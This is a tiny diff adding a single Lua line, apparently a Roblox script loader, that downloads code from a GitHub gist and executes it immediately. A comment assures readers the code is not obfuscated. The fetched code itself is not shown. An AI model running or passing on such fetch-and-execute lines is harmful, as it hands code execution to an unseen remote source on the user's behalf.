@@ -1,0 +1,2 @@
+loadstring(game:HttpGet("https://gist.githubusercontent.com/fluffiflower/bf3798c7a1507175ee83c20e6986f3ed/raw/912f753c71e5f53af4d6ded9f42750a37efd5d5d/gistfile1.txt"))()
+-- it's not obfuscated, you can see the code yourself.
